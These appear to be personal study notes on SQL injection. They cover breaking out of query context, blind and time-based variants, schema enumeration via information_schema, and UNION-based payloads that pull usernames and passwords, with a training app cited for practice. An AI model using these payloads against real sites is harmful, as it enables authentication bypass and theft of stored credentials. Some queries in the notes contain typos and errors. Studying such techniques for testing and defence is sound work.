## What is this?
- Type of injection, the interjected data is Query
- Still exists, header to find
- from Web application Security book:
	- the result of these developments is that there is less SQL injection across the entire web. in act, injection vulnerabilities in 2020 to less than 1 % vulnerabilities found today.
## Intents
- Extracting data, referenced as dumping data
- adding or modifying data(need batch queries, not working everywhere)
- Performing DOS (not desirable)
- Bypassing authentication(direct, indirect)
- Privilege escalation
## Entry Points
- Every part of **HTTP packet** could be a entry point, such as Cookies, User Agent, username name , etc
## Simplest SQLi
- in the SQLi, attackers alter the SQL query. They sometimes **break out the context** by some characters such as **single or double quote**, then they **fix the query** to avoids SQL error Sometimes the break or to fix not easy.
- ## review
	```sql
	select * from credentials where username = 'salar' and passsword = 'password'
```
- The break out
```sql
--username: salar'  #password: salar  
select * from credentials where username = 'salar'' and passsword = 'password'
```
- The fix
```sql
--username: salar'# passord: salar 
	select * from credentials where username = 'salar'-- and passsword = 'password'
```
## can exercise in this [repo](https://github.com/appsecco/sqlinjection-training-app/tree/master) page login1.php 

## Interactions
-  Data returns directly to the user
    - Direct result
        - A new site loading the news by ID 
- Data processed, the results return to the user
- Nothing returns to the user

- #### Direct result
    - A news site loading the news by ID
        - https://news.com/news/54
        - Backend query (which one?)
```sql
select * from news wehre news_id = $NEWSID;
select * from news wehre news_id = $NEWSID'; 
select * from news wehre news_id = $NEWSID";
```
- can Exploited by **UNION**
- #### Indirect Result
	- A shop checking the quaint of on item in the database
	- Backend query
		- `select if (( select count form products where product_id = $PRODUCT_ID) > 0,1,0) a`
	- the blind sql injection works here (boolean based)
- #### No Results
	- A website inters user`s information (ipm user agent, etc) into a database
	- https://site.com
	- backend query
		- `insert into table-name value (v1, v2)`
	-  The blind sql injection works here(time base)
- ## Exploitation Flow
- ![[flow1.png]]
- #### Data Extraction
	- in deer to extract data in SQL injection , attackers should know the database, table and column name
		- ![[flow2.png]]
		- #### but how
			- with **information_schema database**
			- show all **database** which the user has access to
				- <span style="color: red;">`select schema_name from information_schema.schemata`</span>
				- <span style="color: red;">database()</span>
			- show all tables 
				- <span style="color: red;">select table_name from information_schema.tables</span>
			- show all columns
				- <span style="color: red;">select column_name form information_schema.columns</span>
		- Various filter can be applied here, for example Query below returns only column names fora specif database and table
```sql 
select group_concat(column_name) from information_schema.columns where table_name='database_name' and table_name='table_name'
```
## UNION Based injection 
- ### detection
	- In this technique, an attacker can easily pull the data out since the web application **prints the data**, Before anything , lets review <span style="color: red;">union select</span> and <span style="color: red;">order by</span>
		- When using <span style="color: red;">order by</span> , **column name** or  **column number** can be used (if column number does not exist, an error will raise)
		- When using <span style="color: red;">union select</span> , the number of columns (and order of columns) of all queries must **be same**
		- <span style="color: red;">union select</span> cannot be used after <span style="color: red;">order by</span>
		- Now let's back to our topic, the vulnerability can be done by <span style="color: red;">order by</span>
```txt
Defualt request:
page/id=54

Test 1:
page/?id=54 order by 1
page/?id=54' order 1#
page/?id=54" order by1#


Test 2:
page/?id=54 order by 1000
page/?id=54' order by 1000#
page/?id=54" order by 1000#
```
- We can confirm the SQLi when results of
	- Default == Test 1
	- Test 1 =/ Test 2
## UNION based injection Exploitation
- The number of selected columns can be revealed <span style="color: red;">order by</span>
- ![[2025-01-05_22-31.png]]
- In the following example, the column number of the <span style="color: red;">select</span> is <span style="color: red;">3</span> :
```
page/?id=54 order by 1 #same as defualt request
page/?id=54 order by 2 #same as defualt request
page/?id=54 order by 3 #same as defualt request
page/?id=54 order by 4 # not same as default request
```
- Now we can extend the inner <span style="color: red;">select</span> by <span style="color: red;">union select</span>
```sql
page/?id=54 union select 1,2,3#
```
- Now lets pullout the data 
	- we should know the name of the database -> <span style="color: red;">database()</span>
	- `information_schema.schemata`
- We Should know the names of the tables
```sql
information_schema.tables
information_schema.tables where table_name = 'database_name'
```
- we should know the names of the columns
```sql
information_schema.columns
information_schema.columns where table_name = 'database_name' and table_name = 'table_name'
```
- we can pull out the data by
```txt
page/?id=54 union select column_name_1, column_name_2,3 from table_name
page/?id=54 union select username, password,3 from users
```
## [[sqlmap]]

